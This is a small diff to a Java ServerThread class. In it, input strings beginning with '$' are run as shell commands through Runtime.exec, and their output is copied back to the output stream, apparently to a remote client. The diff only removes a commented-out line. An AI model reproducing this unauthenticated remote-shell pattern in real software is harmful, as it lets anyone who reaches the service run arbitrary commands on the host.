@@ -111,7 +111,6 @@ public class ServerThread extends BaseServiceImpl implements Runnable{
                 }else if(str.startsWith("$")){
                     try{
                         String[] cmd = { currentPath, "-c", str.substring(1) };
-                        //String[] command = str.substring(1).split("777777");
                         InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                         copy(inputStream,out);
                     }catch (Exception e){
